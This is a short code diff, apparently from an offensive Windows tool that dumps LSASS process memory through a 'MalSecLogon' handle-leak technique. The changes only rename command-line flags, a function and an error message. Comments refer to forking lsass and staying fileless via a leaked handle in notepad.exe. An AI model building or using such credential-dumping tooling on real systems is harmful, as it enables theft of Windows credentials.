@@ -177,9 +177,9 @@ VOID set_command_line(
     if (use_valid_sig)
         wcsncat(command_line, L" -v", MAX_PATH);
     // malseclogon
-    wcsncat(command_line, L" -m", MAX_PATH);
+    wcsncat(command_line, L" -sll", MAX_PATH);
     // --stage 2
-    wcsncat(command_line, L" --stage2", MAX_PATH);
+    wcsncat(command_line, L" -s2", MAX_PATH);
 }
 
 BOOL save_new_process_pid(
@@ -245,7 +245,7 @@ VOID kill_created_processes(
  * or use a another binary (like notepad.exe) and duplicate
  * the leaked handle in order to remain fileless
  */
-BOOL MalSecLogon(
+BOOL malseclogon_handle_leak(
     IN LPCSTR binary_path,
     IN LPCSTR dump_path,
     IN BOOL fork_lsass,
@@ -284,7 +284,7 @@ BOOL MalSecLogon(
         created_processes);
     if (!success)
     {
-        PRINT_ERR("MalSecLogon technique failed!");
+        PRINT_ERR("the --malseclogon-leak-local technique failed!");
         if (created_processes)
         {
             intFree(created_processes); created_processes = NULL;
